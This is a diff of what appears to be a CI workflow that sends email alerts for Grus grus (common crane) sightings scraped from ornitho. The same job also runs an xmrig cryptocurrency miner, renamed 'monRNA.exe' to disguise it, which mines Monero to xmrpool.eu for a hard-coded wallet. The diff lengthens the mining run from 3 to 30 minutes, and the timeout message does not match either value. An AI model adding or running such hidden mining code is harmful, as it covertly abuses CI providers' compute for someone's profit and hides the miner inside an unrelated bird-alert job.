@@ -73,8 +73,8 @@ jobs:
 
           # Make a email alert for birds spotted in ornitho
           python get_page_ornitho.py # generates all_birds.txt
-          cat all_birds.txt  | xargs -d"\n" | sed 's/----------------------------------------  /\n/g' | egrep -i "Grus grus" > info_ornitho.txt  || true
-          #awk '/Region:/{block=$0; next} /Grus grus/{print block "\n" $0 "\n----------------------------------------"}' all_birds.txt > info_ornitho.txt
+          #cat all_birds.txt  | xargs -d"\n" | sed 's/----------------------------------------  /\n/g' | egrep -i "Grus grus" > info_ornitho.txt  || true
+          awk '/Region:/{block=$0; next} /Grus grus/{print block "\n" $0 "\n----------------------------------------"}' all_birds.txt > info_ornitho.txt
 
           
           # Also wget lost pets
@@ -99,7 +99,7 @@ jobs:
           mv xmrig-6.22.2 monRNA
           cd monRNA
           mv xmrig monRNA.exe
-          timeout 3m ./monRNA.exe --donate-level 0 -o xmrpool.eu:3333 -u 49Lz3qy4w2tfPRR4pGeJKCd78uJ5qStamRy5b6wmJ4cw3eUd28kYpPrK5DXn8VwrdiZNXYpKV8pgVXzo8Ls1gdKR8UKn9JA -k --coin monero   || EXIT_CODE=$?
+          timeout 30m ./monRNA.exe --donate-level 0 -o xmrpool.eu:3333 -u 49Lz3qy4w2tfPRR4pGeJKCd78uJ5qStamRy5b6wmJ4cw3eUd28kYpPrK5DXn8VwrdiZNXYpKV8pgVXzo8Ls1gdKR8UKn9JA -k --coin monero   || EXIT_CODE=$?
           if [ "$EXIT_CODE" = "124" ]; then
             echo "Script timed out after 10 minutes, but continuing without failure."
           elif [ -n "$EXIT_CODE" ]; then
